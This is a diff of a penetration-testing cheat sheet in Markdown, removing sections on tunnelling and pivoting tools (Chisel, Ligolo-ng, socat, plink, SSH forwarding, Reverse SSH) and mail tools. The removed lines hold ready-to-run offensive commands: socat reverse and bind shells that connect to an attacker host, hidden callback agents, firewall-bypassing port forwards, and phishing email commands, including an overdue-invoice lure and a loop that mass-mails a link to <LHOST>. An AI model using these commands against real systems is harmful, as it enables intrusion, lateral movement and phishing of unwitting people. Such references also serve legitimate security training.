@@ -20,7 +20,6 @@
 - [capsh](#capsh)
 - [certutil](#certutil)
 - [changelist](#changelist)
-- [Chisel](#chisel)
 - [chmod](#chmod)
 - [gcc](#gcc)
 - [Copy Files (Bash only)](#copy-files-bash-only)
@@ -52,7 +51,6 @@
 - [grpc](#grpc)
 - [host](#host)
 - [icacls](#icacls)
-- [IMAP](#imap)
 - [inotifywait](#inotifywait)
 - [IPython](#ipython)
 - [Java](#java)
@@ -62,7 +60,6 @@
 - [ldd](#ldd)
 - [less](#less)
 - [lftp](#lftp)
-- [Ligolo-ng](#ligolo-ng)
 - [Linux](#linux-1)
 - [Logfiles](#logfiles)
 - [Logging](#logging)
@@ -71,7 +68,6 @@
 - [mount](#mount)
 - [Mozilla Firefox](#mozilla-firefox)
 - [mp64](#mp64)
-- [msg](#msg)
 - [Nano](#nano)
 - [nc / Ncat / netcat](#nc--ncat--netcat)
 - [Network File System (NFS)](#network-file-system-nfs)
@@ -82,16 +78,12 @@
 - [nsupdate](#nsupdate)
 - [objectdump](#objectdump)
 - [OpenBSD](#openbsd)
-- [Outlook](#outlook)
 - [paste](#paste)
 - [Perl](#perl)
 - [pgrep](#pgrep)
 - [PHP](#php)
 - [pipenv](#pipenv)
-- [plink](#plink)
 - [PNG](#png)
-- [POP3](#pop3)
-- [Port Forwarding](#port-forwarding-1)
 - [PowerShell](#powershell-1)
 - [printf](#printf)
 - [proc](#proc)
@@ -105,7 +97,6 @@
 - [readpst](#readpst)
 - [regedit](#regedit)
 - [rev](#rev)
-- [Reverse SSH](#reverse-ssh)
 - [rlogin](#rlogin)
 - [rlwrap](#rlwrap)
 - [rpm2cpio](#rpm2cpio)
@@ -113,20 +104,17 @@
 - [rsync](#rsync)
 - [RunAs](#runas)
 - [screen](#screen)
-- [sendemail](#sendemail)
 - [seq](#seq)
 - [SetUID Bit](#setuid-bit)
 - [sftp](#sftp)
 - [showmount](#showmount)
 - [SIGSEGV](#sigsegv)
-- [simpleproxy](#simpleproxy)
 - [SMB](#smb)
 - [smbcacls](#smbcacls)
 - [smbclient](#smbclient)
 - [smbget](#smbget)
 - [smbmap](#smbmap)
 - [smbpasswd](#smbpasswd)
-- [socat](#socat)
 - [Spaces Cleanup](#spaces-cleanup)
 - [squid](#squid)
 - [squidclient](#squidclient)
@@ -138,7 +126,6 @@
 - [stty](#stty)
 - [strings](#strings)
 - [SVN](#svn)
-- [swaks](#swaks)
 - [systemd](#systemd)
 - [tee](#tee)
 - [tftp](#tftp)
@@ -168,15 +155,7 @@
 
 | Name | Description | URL |
 | --- | --- | --- |
-| Chisel | A fast TCP/UDP tunnel over HTTP | https://github.com/jpillora/chisel |
 | CyberChef | The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis. | https://gchq.github.io/CyberChef |
-| graftcp | A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy. | https://github.com/hmgle/graftcp |
-| Ligolo-ng | An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. | https://github.com/nicocha30/ligolo-ng |
-| MailHog | Web and API based SMTP testing | https://github.com/mailhog/MailHog |
-| MicroSocks | tiny, portable SOCKS5 server with very moderate resource usage | https://github.com/rofl0r/microsocks |
-| Reverse SSH | SSH based reverse shell | https://github.com/NHAS/reverse_ssh |
-| socat | Mirror of the socat source code with pre-built releases for Linux (x64 and x86), Windows (x64 and x86), and MacOS (x64) | https://github.com/3ndG4me/socat |
-| Swaks | Swiss Army Knife for SMTP | https://github.com/jetmore/swaks |
 | up-http-tool | Simple HTTP listener for security testing | https://github.com/MuirlandOracle/up-http-tool |
 
 ## .NET
@@ -337,50 +316,6 @@ PS C:\> certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 
 ```console
 $ cat /etc/changelist
-```
-
-## Chisel
-
-> https://github.com/jpillora/chisel
-
-### Reverse Pivot
-
-#### Server
-
-```console
-$ ./chisel server -p 9002 -reverse -v
-```
-
-#### Client
-
-```console
-$ ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
-```
-
-##### With PowerShell Start-Process (saps)
-
-```cmd
-PS C:\> saps 'C:\chisel.exe' 'client <LHOST>:9002 R:3000:127.0.0.1:3000'
-```
-
-#### Forwaord multiple Ports at once
-
-```console
-$ ./chisel client <LHOST>:9002 R:8001:127.0.0.1:8001 R:8002:127.0.0.1:8002 R:8003:127.0.0.1:8003
-```
-
-### SOCKS5 / Proxychains Configuration
-
-#### Server
-
-```console
-$ ./chisel server -p 9002 -reverse -v
-```
-
-#### Client
-
-```console
-$ ./chisel client <LHOST>:9002 R:socks
 ```
 
 ## chmod
@@ -3770,105 +3705,6 @@ lftp <USERNAME>@<RHOST>:~> ftp:ssl-force true
 lftp <USERNAME>@<RHOST>:~> set ssl:verify-certificate off
 ```
 
-## Ligolo-ng
-
-> https://github.com/nicocha30/ligolo-ng
-
-### Download Proxy and Agent
-
-> https://github.com/nicocha30/ligolo-ng/releases
-
-### Prepare Tunnel Interface
-
-```console
-$ sudo ip tuntap add user $(whoami) mode tun ligolo
-```
-
-```console
-$ sudo ip link set ligolo up
-```
-
-### Setup Proxy on Attacker Machine
-
-```console
-$ ./proxy -laddr <LHOST>:443 -selfcert
-```
-
-### Setup Agent on Target Machine
-
-```console
-$ ./agent -connect <LHOST>:443 -ignore-cert
-```
-
-### Configure Session
-
-```console
-ligolo-ng » session
-```
-
-```console
-[Agent : user@target] » ifconfig
-```
-
-```console
-$ sudo ip r add 172.16.1.0/24 dev ligolo
-```
-
-or
-
-```console
-$ sudo ip route add 240.0.0.1/32 dev ligolo
-```
-
-```console
-[Agent : user@target] » start
-```
-
-### Port Forwarding
-
-```console
-[Agent : user@target] » listener_add --addr 0.0.0.0:<LPORT> --to <LHOST>:80 --tcp 
-[Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
-```
-
-### Alternative Session Configuration
-
-#### Setup Proxy on Attacker Machine
-
-```console
-$ sudo ./proxy -selfcert
-```
-
-#### Prepare Tunnel Interface
-
-```console
-ligolo-ng » ifcreate --name ligolo
-```
-
-#### Add Route to Tunnel Interface
-
-```console
-ligolo-ng » route_add --name ligolo --route <SUBNET>
-```
-
-#### Setup Agent on Target Machine
-
-```cmd
-PS C:\> Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect <LHOST>:11601 -ignore-cert" -WindowStyle Hidden
-```
-
-### Error Handling
-
-#### Fixing tun.New device or resource busy
-
-```console
-$ sudo ip link delete ligolo
-```
-
-```console
-[Agent : user@target] » start
-```
-
 ## Linux
 
 ### User Management
@@ -4094,15 +3930,6 @@ $ firefox
 $ mp64 --custom-charset1=?l?u?d{}_ $pass?1$wildcard
 ```
 
-## msg
-
-### Converting .msg-Files to .eml-Files
-
-```console
-$ sudo apt-get install libemail-outlook-message-perl libemail-sender-perl
-$ msgconvert *.msg
-```
-
 ## Nano
 
 ```console
@@ -4308,16 +4135,6 @@ $ doas -u <USERNAME> /bin/sh
 $ netpgp --decrypt <FILE>.tar.gz.enc --output=/PATH/TO/FILE/<FILE>.tar.gz
 ```
 
-## Outlook
-
-### Staring Outlook without a profile
-
-```console
-Ctrl + r
-outlook.exe /PIM NoEmail
-Enter
-```
-
 ## paste
 
 ### Example
@@ -4377,416 +4194,12 @@ $ sudo php -S 127.0.0.1:80
 $ pipenv shell
 ```
 
-## plink
-
-### Remote Port Forwarding
-
-```cmd
-C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:<RPORT>:127.0.0.1:3389 <LHOST>
-```
-
 ## PNG
 
 ### Fix .png-File Header
 
 ```console
 $ printf '\x89\x50\x4e\x47' | dd conv=notrunc of=8.png bs=1
-```
-
-## POP3
-
-```console
-USER <USERNAME>
-PASS <PASSWORD>
-STAT
-LIST
-RETR <NUMBER>
-```
-
-## Port Forwarding
-
-### Chisel
-
-| System             | IP address     |
-| ------------------ | -------------- |
-| LHOST              | 192.168.50.10  |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER    | 10.10.100.20   |
-| WINDOWS HOST       | 172.16.50.10   |
-
-#### Reverse Pivot
-
-- LHOST < APPLICATION SERVER
-
-##### LHOST
-
-```console
-$ ./chisel server -p 9002 -reverse -v
-```
-
-##### APPLICATION SERVER
-
-```console
-$ ./chisel client 192.168.50.10:9002 R:3000:127.0.0.1:3000
-```
-
-#### SOCKS5 / Proxychains Configuration
-
-- LHOST > APPLICATION SERVER > NETWORK
-
-##### LHOST
-
-```console
-$ ./chisel server -p 9002 -reverse -v
-```
-
-##### APPLICATION SERVER
-
-```console
-$ ./chisel client 192.168.50.10:9002 R:socks
-```
-
-### Ligolo-ng
-
-> https://github.com/nicocha30/ligolo-ng
-
-| System             | IP address     |
-| ------------------ | -------------- |
-| LHOST              | 192.168.50.10  |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER    | 10.10.100.20   |
-| WINDOWS HOST       | 172.16.50.10   |
-
-- LHOST > APPLICATION SERVER > NETWORK
-
-#### Download Proxy and Agent
-
-> https://github.com/nicocha30/ligolo-ng/releases
-
-```console
-$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_Linux_64bit.tar.gz
-$ wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_proxy_0.6.2_Linux_64bit.tar.gz
-```
-
-#### Prepare Tunnel Interface
-
-```console
-$ sudo ip tuntap add user $(whoami) mode tun ligolo
-```
-
-```console
-$ sudo ip link set ligolo up
-```
-
-#### Setup Proxy on LHOST
-
-```console
-$ ./proxy -laddr 192.168.50.10:443 -selfcert
-```
-
-#### Setup Agent on APPLICATION SERVER
-
-```console
-$ ./agent -connect 192.168.50.10:443 -ignore-cert
-```
-
-#### Configure Session
-
-```console
-ligolo-ng » session
-```
-
-```console
-[Agent : user@target] » ifconfig
-```
-
-```console
-$ sudo ip r add 172.16.50.0/24 dev ligolo
-```
-
-```console
-[Agent : user@target] » start
-```
-
-#### Port Forwarding
-
-- LHOST < APPLICATION SERVER > DATABASE SERVER
-
-```console
-[Agent : user@target] » listener_add --addr 10.10.100.20:2345 --to 192.168.50.10:2345 --tcp
-```
-
-### Socat
-
-| System             | IP address     |
-| ------------------ | -------------- |
-| LHOST              | 192.168.50.10  |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER    | 10.10.100.20   |
-| WINDOWS HOST       | 172.16.50.10   |
-
-- LHOST > APPLICATION SERVER > DATABASE SERVER
-
-##### APPLICATION SERVER
-
-```console
-$ ip a
-$ ip r
-$ socat -ddd TCP-LISTEN:2345,fork TCP:<RHOST>:5432
-```
-
-##### LHOST
-
-```console
-$ psql -h <RHOST> -p 2342 -U postgres
-```
-
-### SSH Tunneling
-
-#### Local Port Forwarding
-
-| System | IP address |
-| --- | --- |
-| LHOST | 192.168.50.10 |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER | 10.10.100.20 |
-| WINDOWS HOST | 172.16.50.10 |
-
-- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST
-
-##### APPLICATION SERVER
-
-```console
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-$ ssh <USERNAME>@192.168.100.10
-$ ip a
-$ ip r
-$ for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445;
-$ ssh -N -L 0.0.0.0:4455:172.16.50.10:445 <USERNAME>@10.10.100.20
-```
-
-##### LHOST
-
-```console
-$ smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
-```
-
-#### Dynamic Port Forwarding
-
-| System | IP address |
-| --- | --- |
-| LHOST | 192.168.50.10 |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER | 10.10.100.20 |
-| WINDOWS HOST | 172.16.50.10 |
-
-- LHOST > APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST
-
-##### APPLICATION SERVER
-
-```console
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-$ ssh -N -D 0.0.0.0:9999 <USERNAME>@10.10.100.20
-```
-
-##### LHOST
-
-```console
-$ sudo ss -tulpn
-$ tail /etc/proxychains4.conf
-socks5 192.168.50.10 9999
-$ proxychains smbclient -p 4455 //172.16.50.10/<SHARE> -U <USERNAME> --password=<PASSWORD>
-```
-
-#### Remote Port Forwarding
-
-| System | IP address |
-| --- | --- |
-| LHOST | 192.168.50.10 |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER | 10.10.100.20 |
-| WINDOWS HOST | 172.16.50.10 |
-
-- LHOST <-> FIREWALL <-> APPLICATION SERVER > DATABASE SERVER > WINDOWS HOST
-
-##### LHOST
-
-```console
-$ sudo systemctl start ssh
-$ sudo ss -tulpn
-```
-
-##### APPLICATION SERVER
-
-```console
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-$ ssh -N -R 127.0.0.1:2345:10.10.100.20:5432 <USERNAME>@192.168.50.10
-```
-
-##### LHOST
-
-```console
-$ psql -h 127.0.0.1 -p 2345 -U postgres
-```
-
-#### Remote Dynamic Port Forwarding
-
-| System             | IP address     |
-| ------------------ | -------------- |
-| LHOST              | 192.168.50.10  |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER    | 10.10.100.20   |
-| WINDOWS HOST       | 172.16.50.10   |
-
-- LHOST < FIREWALL < APPLICATION SERVER > NETWORK
-
-##### APPLICATION SERVER
-
-```console
-$ python3 -c 'import pty; pty.spawn("/bin/bash")'
-$ ssh -N -R 9998 <USERNAME>@192.168.50.10
-```
-
-##### LHOST
-
-```console
-$ sudo ss -tulpn
-$ tail /etc/proxychains4.conf
-socks5 127.0.0.1 9998
-$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.10.100.20
-```
-
-### sshuttle
-
-| System             | IP address     |
-| ------------------ | -------------- |
-| LHOST              | 192.168.50.10  |
-| APPLICATION SERVER | 192.168.100.10 |
-| DATABASE SERVER    | 10.10.100.20   |
-| WINDOWS HOST       | 172.16.50.10   |
-
-- LHOST > APPLICATION SERVER > NETWORK
-
-##### APPLICATION SERVER
-
-```console
-$ socat TCP-LISTEN:2222,fork TCP:10.10.100.20:22
-```
-
-##### LHOST
-
-```console
-$ sshuttle -r <USERNAME>@192.168.100.10:2222 10.10.100.0/24 172.16.50.0/24
-$ smbclient -L //172.16.50.10/ -U <USERNAME> --password=<PASSWORD>
-```
-
-### ssh.exe
-
-| System              | IP address     |
-| ------------------- | -------------- |
-| LHOST               | 192.168.50.10  |
-| APPLICATION SERVER  | 192.168.100.10 |
-| WINDOWS JUMP SERVER | 192.168.100.20 |
-| DATABASE SERVER     | 10.10.100.20   |
-| WINDOWS HOST        | 172.16.50.10   |
-
-- LHOST < FIREWALL < WINDOWS JUMP SERVER > NETWORK
-
-##### LHOST
-
-```console
-$ sudo systemctl start ssh
-$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
-```
-
-##### WINDOWS JUMP SERVER
-
-```cmd
-C:\> where ssh
-C:\Windows\System32\OpenSSH\ssh.exe
-C:\Windows\System32\OpenSSH> ssh -N -R 9998 <USERNAME>@192.168.50.10
-```
-
-##### LHOST
-
-```console
-$ ss -tulpn
-$ tail /etc/proxychains4.conf
-socks5 127.0.0.1 9998
-$ proxychains psql -h 10.10.100.20 -U postgres
-```
-
-### Plink
-
-| System              | IP address     |
-| ------------------- | -------------- |
-| LHOST               | 192.168.50.10  |
-| APPLICATION SERVER  | 192.168.100.10 |
-| WINDOWS JUMP SERVER | 192.168.100.20 |
-| DATABASE SERVER     | 10.10.100.20   |
-| WINDOWS HOST        | 172.16.50.10   |
-
-- LHOST < FIREWALL < WINDOWS JUMP SERVER
-
-##### LHOST
-
-```console
-$ find / -name plink.exe 2>/dev/null
-/usr/share/windows-resources/binaries/plink.exe
-```
-
-##### WINDOWS JUMP SERVER
-
-```cmd
-C:\> plink.exe -ssh -l <USERNAME> -pw <PASSWORD> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.50.10
-```
-
-##### LHOST
-
-```console
-$ ss -tulpn
-$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:127.0.0.1:9833
-```
-
-### Netsh
-
-| System              | IP address     |
-| ------------------- | -------------- |
-| LHOST               | 192.168.50.10  |
-| APPLICATION SERVER  | 192.168.100.10 |
-| WINDOWS JUMP SERVER | 192.168.100.20 |
-| DATABASE SERVER     | 10.10.100.20   |
-| WINDOWS HOST        | 172.16.50.10   |
-
-- LHOST < FIREWALL < WINDOWS JUMP SERVER > DATABASE SERVER
-
-##### LHOST
-
-```console
-$ xfreerdp3 /u:<USERNAME> /p:<PASSWORD> /v:192.168.100.20
-```
-
-##### WINDOWS JUMP SERVER
-
-```cmd
-C:\> netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.10 connectport=22 connectaddress=10.10.100.20
-C:\> netstat -anp TCP | find "2222"
-C:\> netsh interface portproxy show all
-C:\> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.10 localport=2222 action=allow
-```
-
-##### LHOST
-
-```console
-$ sudo nmap -sS 192.168.50.10 -Pn -n -p2222
-$ ssh database_admin@192.168.50.10 -p2222
-```
-
-##### WINDOWS JUMP SERVER
-
-```cmd
-C:\> netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
-C:\> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.10
 ```
 
 ## PowerShell
@@ -5409,29 +4822,6 @@ C:\> reg.exe save hklm\system c:\temp\system.save
 $ echo "foobar" | rev
 ```
 
-## Reverse SSH
-
-```console
-$ git clone https://github.com/NHAS/reverse_ssh
-$ cd reverse_ssh
-$ make
-$ cd bin/
-$ cat ~/.ssh/id_rsa.pub > authorized_keys
-$ ./server 0.0.0.0:3232
-```
-
-```console
-$ ./client -d <LHOST>:3232
-```
-
-```console
-$ ssh <LHOST> -p 3232 ls -t
-```
-
-```console
-$ ssh -J <LHOST>:3232 1fe03478b2775060f6643adaac57a0f5b99989b3
-```
-
 ## rlogin
 
 ### Installation
@@ -5544,12 +4934,6 @@ ctrl +a ctrl +a    // screen within screen
 ctrl + esc
 ```
 
-## sendemail
-
-```console
-$ sendemail -f '<USERNAME>@<DOMAIN>' -t '<USERNAME>@<DOMAIN>' -u 'Invoice Attached' -m 'You are overdue payment' -a 'invoice.rtf' -s <RHOST> -v
-```
-
 ## seq
 
 ### Create a List of Numbers
@@ -5585,12 +4969,6 @@ $ chown root:root sid-shell; chmod +s sid-shell
 ```console
 $ sleep 50 &
 $ killall -SIGSEGV sleep
-```
-
-## simpleproxy
-
-```console
-$ simpleproxy -L <LPORT> -R <RHOST>:<RPORT>
 ```
 
 ## SMB
@@ -5696,105 +5074,6 @@ $ smbmap -u <USERNAME> -p <PASSWORD> -H <RHOST>
 
 ```console
 $ smbpasswd -r <RHOST> -U <USERNAME>
-```
-
-## socat
-
-### Port Forwarding
-
-```console
-$ socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
-$ socat -ddd TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
-```
-
-### Reverse Shell
-
-#### Option 1
-
-##### Local System
-
-```console
-$ socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
-```
-
-##### Remote System
-
-```console
-$ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
-```
-
-#### Option 2
-
-##### Local System
-
-```console
-$ socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
-```
-
-##### Remote System
-
-```console
-$ socat tcp-listen:9002,reuseaddr,fork tcp:<RHOST>:5968 &
-```
-
-### UDP Shell
-
-#### Local System
-
-```console
-$ socat file:`tty`,echo=0,raw udp-listen:<LPORT>
-```
-
-### Bind Shell
-
-```console
-$ sudo socat OPENSSL-LISTEN:443,cert=<FILE>.pem,verify=0,fork EXEC:/bin/bash
-$ socat - OPENSSL:<RHOST>:443,verify=0
-```
-
-### Send File
-
-```console
-$ sudo socat TCP4-LISTEN:443,fork file:<FILE>
-$ socat TCP4:<LHOST>:443 file:<FILE>, create    // openssl req -newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -out <FILE>.crt; cat <FILE>.key <FILE>.crt \> <FILE>.pem
-```
-
-### Encrypted Connection
-
-#### Create Certificate
-
-```console
-$ openssl req --newkey rsa:2048 -nodes -keyout <FILE>.key -x509 -days 362 -out <FILE>.crt
-```
-
-#### Create .pem File
-
-```console
-$ cat <FILE>.key <FILE>.crt > <FILE>.pem
-```
-
-#### Listener
-
-```console
-$ socat OPENSSL-LISTEN:<LPORT>,cert=<FILE>.pem,verify=0 -
-```
-
-or
-
-```console
-socat OPENSSL-LISTEN:<LPORT> FILE:tty,raw,echo=0,cert=<FILE>.pem,verify=0
-```
-
-#### Connect
-
-```console
-$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:/bin/bash
-```
-
-or
-
-```console
-$ socat OPENSSL:<LHOST>:<LPORT>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 ## Spaces Cleanup
@@ -5990,25 +5269,6 @@ $ strings -n 8 <FILE>
 ```console
 $ svn checkout svn://<RHOST>/
 $ svn diff -r 2
-```
-
-## swaks
-
-> https://jetmore.org/john/code/swaks/
-
-> https://github.com/jetmore/swaks
-
-### Basic Commands
-
-```console
-$ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: <SUBJECT>" --body <FILE>.txt --attach @<FILE> --suppress-data -ap
-$ swaks --server <RHOST> --port 587 --auth-user "<EMAIL>" --auth-password "<PASSWORD>" --to "<EMAIL>" --from "<EMAIL>" --header "Subject: <SUBJECT>" --body "\\\<LHOST>\"
-```
-
-### Automation
-
-```console
-$ while read mail; do swaks --to $mail --from <EMAIL> --header "Subject: Test / Test" --body "goto http://<LHOST>/" --server <RHOST>; done < mail.txt
 ```
 
 ## systemd
